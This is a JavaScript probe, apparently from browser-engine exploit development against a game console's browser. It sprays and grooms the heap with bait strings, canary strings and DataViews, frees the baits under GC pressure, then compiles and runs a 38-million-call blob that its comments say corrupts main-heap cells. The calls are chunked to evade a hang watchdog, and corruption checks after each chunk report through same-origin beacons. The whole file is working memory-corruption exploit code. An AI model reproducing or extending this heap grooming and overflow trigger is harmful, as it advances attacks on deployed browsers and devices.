// p164-main — p164 probe with the DETECTOR ON THE MAIN HEAP.
//
// Why: the 38.3M-call sweep runs on the main thread and corrupts cells of the
// main isolate's heap. In the original p164 both canaries and view cells were
// allocated inside a Worker (separate isolate/heap), so the sweep could never
// be observed by them. This variant puts the p156 canary strings and the
// DataView cells in the SAME heap the sweep runs in.
//
// Everything else is the proven layout:
//   1. 20 x 100KB bait strings (main heap)
//   2. 8 x 100KB canary strings + 12 small DataViews + 4 marge DataViews (main)
//   3. free baits, 30 GC-pressure rounds (creates the holes the sweep reuses)
//   4. chunked 38,348,816-call blob (200k calls/chunk, 120ms yields)
//      — the yields beat the ~32s hang watchdog measured on this console
//   5. after EVERY chunk: check canary .length/charCodeAt and every view's
//      byteLength/byteOffset. On any change: dump every view (byteLength,
//      byteOffset, 16 raw bytes via getUint32) with PRE-OK / VECTOR-HIT /
//      LEN-HIT / DEAD classification.
//   6. final check + verdict beacons (M-SURVIVED-CLEAN / M-SURVIVED-HIT)
//
// Beacon prefix: V164- (tags M-*)
// Liveness: same-origin /hold XHR (host logs the exact process-death time).

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function u32hex(v) {
    var s = '';
    for (var b = 3; b >= 0; b--) s += hx((v >>> (8 * b)) & 0xFF);
    return s;
  }

  B('BOOT');

  // ── KERNEL-LEVEL LIVENESS ORACLE (same-origin) ──
  try {
    var __hold = new XMLHttpRequest();
    __hold.open('GET', location.origin + '/hold?tag=V164-M-' + Date.now(), true);
    __hold.onreadystatechange = function() {};
    __hold.send();
    B('HOLD-XHR');
  } catch (e) { B('HOLD-ERR'); }

  var STR_LEN = 100000;
  var SMALL_AB = 16;
  var MARGE_AB = 102400;
  var CANARY = 0x41;    // 'A'
  var FILL = 0x44;      // 'D'

  // ── PHASE 1: BAIT STRINGS (main heap) ──
  B('BAIT-START');
  var baitChunk = '';
  for (var bc = 0; bc < 100; bc++) baitChunk += 'BBBBBBBBBB';
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-20');

  // ── PHASE 2: MAIN-HEAP TARGETS ──
  // 8 canary strings — the proven p156 detector, now in the sweep's own heap.
  var canaries = [];
  var chunkA = '';
  for (var ca = 0; ca < 100; ca++) chunkA += 'AAAAAAAAAA';
  for (var ci = 0; ci < 8; ci++) {
    var s = '';
    for (var cj = 0; cj < STR_LEN; cj += 1000) s += chunkA;
    s = s.substring(0, STR_LEN);
    s.charCodeAt(0);
    canaries.push(s);
  }
  B('M-CANARIES-' + canaries.length);

  // 12 small DataViews (16B backing stores, cell adjacent to the canaries)
  var smallDVs = [];
  for (var d = 0; d < 12; d++) {
    var ab = new ArrayBuffer(SMALL_AB);
    var u8 = new Uint8Array(ab);
    for (var f = 0; f < SMALL_AB; f++) u8[f] = FILL;
    var dv = new DataView(ab);
    if (dv.byteLength !== SMALL_AB || dv.getUint32(0) !== 0x44444444) {
      B('M-PRE-DV-FAIL-' + d);
      continue;
    }
    smallDVs.push(dv);
  }
  B('M-SMALLDVS-' + smallDVs.length);

  // 4 marge DataViews (102,400B = same size class as the metadata buffer)
  var margeDVs = [];
  for (var m = 0; m < 4; m++) {
    var abm = new ArrayBuffer(MARGE_AB);
    var u8m = new Uint8Array(abm);
    for (var fm = 0; fm < MARGE_AB; fm++) u8m[fm] = FILL;
    var dvm = new DataView(abm);
    if (dvm.byteLength !== MARGE_AB) {
      B('M-PRE-DVM-FAIL-' + m);
      continue;
    }
    margeDVs.push(dvm);
  }
  B('M-MARGEDVS-' + margeDVs.length);

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');

    for (var k = 0; k < baits.length; k++) baits[k] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var g1 = 0; g1 < 1000; g1++) new ArrayBuffer(8192);
      for (var g2 = 0; g2 < 500; g2++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }
    gcPressureRound();
  }

  // ── DETECTION ──
  function dumpView(tag, idx, dv, nominalLen) {
    var bl, bo;
    try { bl = dv.byteLength; } catch(e1) { bl = 'X'; }
    try { bo = dv.byteOffset; } catch(e2) { bo = 'X'; }
    B(tag + '-' + idx + '-bl=' + bl + '-bo=' + bo);

    var words = [];
    for (var off = 0; off < 16; off += 4) {
      try { words.push(u32hex(dv.getUint32(off, false))); }
      catch(e3) { words.push('XXXXXXXX'); }
    }
    var hex = words.join('');

    var cls;
    if (words[0] === 'XXXXXXXX') cls = 'DEAD';
    else if (bl !== nominalLen) cls = 'LEN-HIT';
    else if (hex === '44444444444444444444444444444444') cls = 'PRE-OK';
    else cls = 'VECTOR-HIT';
    B(tag + 'C-' + idx + '-' + cls);
    BP(tag + 'H-' + idx, hex);
  }

  function dumpAll(phase) {
    for (var sd = 0; sd < smallDVs.length; sd++) dumpView('M-DV-' + phase, sd, smallDVs[sd], SMALL_AB);
    for (var md = 0; md < margeDVs.length; md++) dumpView('M-DVM-' + phase, md, margeDVs[md], MARGE_AB);
    for (var c = 0; c < canaries.length; c++) {
      B('M-CH-' + phase + '-' + c + '-len=' + canaries[c].length);
    }
  }

  // Returns true if any cell changed. Cheap enough to run after every chunk.
  function checkCells() {
    var hit = false;
    for (var i = 0; i < canaries.length; i++) {
      var L = canaries[i].length;
      if (L !== STR_LEN) { B('M-LEN-' + i + '-' + L); hit = true; }
      var c8 = canaries[i].charCodeAt(8);
      var c56 = canaries[i].charCodeAt(56);
      if (c8 !== CANARY || c56 !== CANARY) {
        B('M-CHR-' + i + '-' + hx(c8) + '-' + hx(c56));
        hit = true;
      }
    }
    for (var d = 0; d < smallDVs.length; d++) {
      var dv = smallDVs[d], bl, bo;
      try { bl = dv.byteLength; bo = dv.byteOffset; }
      catch(e) { B('M-DVDEAD-' + d); hit = true; continue; }
      if (bl !== SMALL_AB) { B('M-DVLEN-' + d + '-' + bl); hit = true; }
      if (bo !== 0) { B('M-DVBO-' + d + '-' + bo); hit = true; }
    }
    for (var m = 0; m < margeDVs.length; m++) {
      var dvm = margeDVs[m], blm, bom;
      try { blm = dvm.byteLength; bom = dvm.byteOffset; }
      catch(e2) { B('M-DVMDEAD-' + m); hit = true; continue; }
      if (blm !== MARGE_AB) { B('M-DVMLEN-' + m + '-' + blm); hit = true; }
      if (bom !== 0) { B('M-DVMBO-' + m + '-' + bom); hit = true; }
    }
    return hit;
  }

  // ── PHASE 4: CHUNKED OVERFLOW BUILD (proven 200k/120ms config) ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    var N_OVERFLOW = 38348816;
    var CHUNK = 200000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v164m=[];'];
    for (var ch = 0; ch < CHUNKS; ch++) {
      parts.push('window.__v164m.push(function(a){');
      parts.push(callChunk);
      parts.push('});');
    }
    if (REM > 0) {
      parts.push('window.__v164m.push(function(a){');
      parts.push(remChunk);
      parts.push('});');
    }
    parts.push('window.__v164ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB-N' + CHUNKS + '+R' + REM);
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v164ok ? 'OK' : 'FAIL'));
      if (!window.__v164m || !window.__v164m.length) { B('NO-FN'); return; }
      B('NFNS-' + window.__v164m.length);

      var idx = 0;
      var hitAny = false;

      // Baseline check before any sweep work — proves the detector is clean.
      B('PRE-CHECK-' + (checkCells() ? 'HIT' : 'CLEAN'));

      function runChunk() {
        if (idx >= window.__v164m.length) {
          var finalHit = checkCells();
          B('FINAL-CHECK-' + (finalHit ? 'HIT' : 'CLEAN'));
          dumpAll('FINAL');
          B(finalHit || hitAny ? 'M-SURVIVED-HIT' : 'M-SURVIVED-CLEAN');
          return;
        }
        B('CSTART-' + idx + '-' + Date.now());
        try {
          window.__v164m[idx](function(){});
        } catch(ex) {
          B('CATCH-' + idx + '-' + (ex.message || '').substring(0, 30));
          return;
        }
        if (checkCells()) {
          hitAny = true;
          B('M-HIT-AT-' + idx);
          dumpAll('AT' + idx);
        }
        B('CHUNK-' + (idx + 1) + '-' + Date.now());
        idx++;
        setTimeout(runChunk, 120);
      }

      setTimeout(function() {
        B('CALLING');
        runChunk();
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  phaseFreeBaits();
})();
